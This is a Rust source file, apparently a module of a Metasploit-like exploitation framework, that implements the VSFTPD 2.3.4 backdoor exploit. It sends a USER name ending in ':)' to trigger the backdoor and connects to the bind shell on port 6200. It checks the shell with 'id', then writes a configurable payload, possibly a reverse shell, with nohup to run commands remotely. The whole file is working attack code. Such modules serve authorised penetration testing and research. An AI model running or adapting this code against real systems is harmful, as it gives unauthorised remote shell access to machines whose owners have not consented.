use crate::{
    core::{
        exploit::{remote_tcp::RemoteTcp, Exploit, Info, Kind, Ranking},
        opt::Opt,
        payload,
        payload::Payload,
    },
    util::gen::random_alphanumeric,
};
use log::info;
use std::{
    error::Error,
    io::{BufRead, BufReader, Write},
    net::TcpStream,
    thread,
    time::Duration,
};

pub struct Vsftpd234Backdoor {
    pub remote_tcp: RemoteTcp,
    pub backdoor_port: Option<String>,
}

impl Vsftpd234Backdoor {
    // TODO: When exploit is being used by CLI interaction, can get RHOST and RPORT there and pass it in
    pub fn new(remote_tcp: RemoteTcp, backdoor_port: Option<String>) -> Vsftpd234Backdoor {
        Vsftpd234Backdoor {
            remote_tcp,
            backdoor_port,
        }
    }

    fn run_pretask(payload: Box<dyn Payload + Send + Sync>) -> Result<(), Box<dyn Error>> {
        // TODO: maybe need a way to share runtime throughout the entire lib
        match payload.kind() {
            payload::Kind::ReverseShell => {
                // TODO: how to propogate error
                payload.pretask().unwrap();
            }
            _ => (),
        }
        Ok(())
    }

    fn handle_backdoor(
        &self,
        mut stream: TcpStream,
        mut stream_buf: BufReader<TcpStream>,
        payload: Box<dyn Payload + Send + Sync>,
    ) -> Result<(), Box<dyn Error>> {
        stream.write("id\n".as_bytes())?;

        let mut backdoor_resp = String::new();
        stream_buf.read_line(&mut backdoor_resp)?;

        if !backdoor_resp.contains("uid=") {
            return Err("The backdoor port seems to not be a shell".into());
        }
        info!(
            "Received successful backdoor UID response: {}",
            backdoor_resp.trim()
        );

        let blob_string = &payload.blob_to_string()?;
        thread::spawn(|| {
            // TODO: how to propogate error
            Vsftpd234Backdoor::run_pretask(payload).unwrap();
        });
        thread::sleep(Duration::from_millis(50));

        let payload_text = format!("nohup {} >/dev/null 2>&1", blob_string);
        info!("Writing payload to backdoor stream: {}", payload_text);
        stream.write(payload_text.as_bytes())?;

        thread::sleep(Duration::from_secs(20));
        Ok(())
    }

    fn attempt_backdoor(
        &self,
        payload: Box<dyn Payload + Send + Sync>,
        expected_open: bool,
    ) -> Result<(), Box<dyn Error>> {
        // TODO: for now hardcoding a 1 second sleep because without it the backdoor isn't open in time for the request
        thread::sleep(Duration::from_secs(1));

        let backdoor_port = match &self.backdoor_port {
            Some(backdoor_port) => backdoor_port,
            None => "6200",
        };
        info!("Attempting to access backdoor on port {}", backdoor_port);
        match self
            .remote_tcp
            .custom_connect(&self.remote_tcp.rhost, backdoor_port)
        {
            Ok(stream) => {
                info!(
                    "Port {} used by the backdoor bind listener is open",
                    backdoor_port
                );
                let stream_buf = BufReader::new(stream.try_clone()?);
                self.handle_backdoor(stream, stream_buf, payload)?;
                return Ok(());
            }
            Err(e) => {
                if !expected_open {
                    info!(
                        "Port {} used by backdoor bind listener is not already open: {}",
                        backdoor_port, e
                    );
                } else {
                    return Err(format!(
                        "Port {} used by backdoor bind listener is not open: {}",
                        backdoor_port, e,
                    )
                    .into());
                }
            }
        };
        Ok(())
    }
}

impl Exploit for Vsftpd234Backdoor {
    fn default() -> Self {
        Vsftpd234Backdoor {
            remote_tcp: RemoteTcp {
                rhost: "".to_string(),
                rport: "".to_string(),
                read_timeout: Some(Duration::from_secs(60)),
                write_timeout: Some(Duration::from_secs(60)),
            },
            backdoor_port: None,
        }
    }

    fn kind(&self) -> Kind {
        Kind::Remote
    }

    fn ranking(&self) -> Ranking {
        Ranking::Excellent
    }

    fn info(&self) -> Info {
        Info {
            descriptive_name: "VSFTPD v2.3.4 Backdoor Command Execution".to_string(),
            module_path: "exploit/ftp/vsftpd_234_backdoor".to_string(),
            disclosure_date: "2011-07-03".to_string(),
            ranking: self.ranking().to_string(),
            kind: self.kind().to_string(),
            description:
                "This module exploits a malicious backdoor that was added to the VSFTPD download \
        archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between \
        June 30th 2011 and July 1st 2011 according to the most recent information \
        available. This backdoor was removed on July 3rd 2011."
                    .to_string(),
            license: None,
            author: Some(vec!["hdm".to_string(), "MC".to_string()]),
            references: None,
            platform: Some(vec!["unix".to_string()]),
        }
    }

    fn exploit(
        &self,
        payload: Box<dyn Payload + Send + Sync>,
    ) -> Result<(), Box<dyn std::error::Error>> {
        // First check if backdoor is already open and handle that case

        // TODO: this code is getting pretty convoluted, need to look into refactoring the Payload trait object
        // self.attempt_backdoor(dyn_clone::clone_box(&**payload), false)?;
        self.attempt_backdoor(payload.clone(), false)?;

        let mut stream = self.remote_tcp.connect()?;
        let mut stream_buf = BufReader::new(stream.try_clone()?);

        let mut banner_resp = String::new();
        stream_buf.read_line(&mut banner_resp)?;
        info!("Banner returned from server: {}", banner_resp);

        let user_hash = random_alphanumeric(6);
        stream.write(format!("USER {}:)\r\n", user_hash).as_bytes())?;
        let mut user_hash_resp = String::new();
        stream_buf.read_line(&mut user_hash_resp)?;
        info!("Response to user hash: {}", user_hash_resp);

        if user_hash_resp.contains("530") {
            return Err(
                "Server is configured for anonymous only and the backdoor code cannot be reached"
                    .into(),
            );
        }

        if !user_hash_resp.contains("331") {
            return Err(
                "Server is not responding as expected, response should contain 331 code".into(),
            );
        }

        stream.write(format!("PASS {}\r\n", user_hash).as_bytes())?;

        // Attempt the backdoor after exploitation, it is expected to be open now
        self.attempt_backdoor(payload.clone(), true)?;
        Ok(())
    }

    fn opts(&self) -> Vec<Opt> {
        let mut opts: Vec<Opt> = Vec::new();

        let mut remote_tcp_opts = RemoteTcp::opts();
        opts.append(&mut remote_tcp_opts);

        opts.push(Opt {
            name: "BACKDOOR_PORT".to_string(),
            description: "Backdoor port that the vulnerable VSFTPD server can open".to_string(),
            default_value: Some("6200".to_string()),
            value: Some("6200".to_string()),
        });
        opts
    }

    fn apply_opts(&mut self, opts: Vec<Opt>) -> Result<(), Box<dyn Error>> {
        for opt in opts {
            match opt.name.as_str() {
                "BACKDOOR_PORT" => self.backdoor_port = opt.value,
                // TODO: Need solution so code below is not duplicated for another module which uses RemoteTcp
                "RHOST" => self.remote_tcp.rhost = opt.value.ok_or("RHOST option is required")?,
                "RPORT" => self.remote_tcp.rport = opt.value.ok_or("RPORT option is required")?,
                "READ_TIMEOUT" => {
                    self.remote_tcp.read_timeout = opt
                        .value
                        .and_then(|value| value.parse::<u64>().ok().map(Duration::from_secs))
                }
                "WRITE_TIMEOUT" => {
                    self.remote_tcp.write_timeout = opt
                        .value
                        .and_then(|value| value.parse::<u64>().ok().map(Duration::from_secs))
                }
                _ => info!("Unknown option name {} was provided", opt.name),
            }
        }
        Ok(())
    }
}
